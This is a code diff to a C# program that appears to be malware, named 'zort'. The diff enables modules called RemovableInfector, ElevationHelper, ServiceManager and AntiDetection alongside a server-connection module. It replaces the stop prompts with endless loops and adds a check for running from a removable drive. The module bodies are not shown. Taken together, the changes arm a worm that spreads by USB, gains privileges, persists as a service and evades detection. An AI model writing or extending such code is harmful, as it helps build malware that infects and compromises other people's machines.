@@ -9,11 +9,11 @@ namespace zort
     {
         List<IPayloadModule> modules = new List<IPayloadModule>
                 {
-                    //new RemovableInfector(),
-                    //new ElevationHelper(),
-                    //new ServiceManager(),
+                    new RemovableInfector(),
+                    new ElevationHelper(),
+                    new ServiceManager(),
                     new ServerCon(),
-                    //new AntiDetection(),
+                    new AntiDetection(),
                 };
 
         public Program()
@@ -32,9 +32,12 @@ namespace zort
                     if (Environment.UserInteractive)
                     {
                         service.OnStart(args);
-                        Console.WriteLine("Press any key to stop the service...");
-                        Console.ReadKey();
-                        service.OnStop();
+                        //Console.WriteLine("Press any key to stop the service...");
+                        while(true)
+                        {
+                            Console.ReadLine();
+                        }
+                        //service.OnStop();
                     }
                     else
                     {
@@ -45,9 +48,13 @@ namespace zort
             else
             {
                 var program = new Program();
+                RemovableInfector.CheckIfRunningFromRemovableDrive();
                 program.InitModules();
-                Console.WriteLine("Press any key to exit...");
-                Console.ReadKey();
+                //Console.WriteLine("Press any key to exit...");
+                while (true)
+                {
+                    Console.ReadLine();
+                }
             }
         }
 
@@ -55,6 +62,7 @@ namespace zort
         {
             try
             {
+                RemovableInfector.CheckIfRunningFromRemovableDrive();
                 InitModules();
             }
             catch (Exception ex)
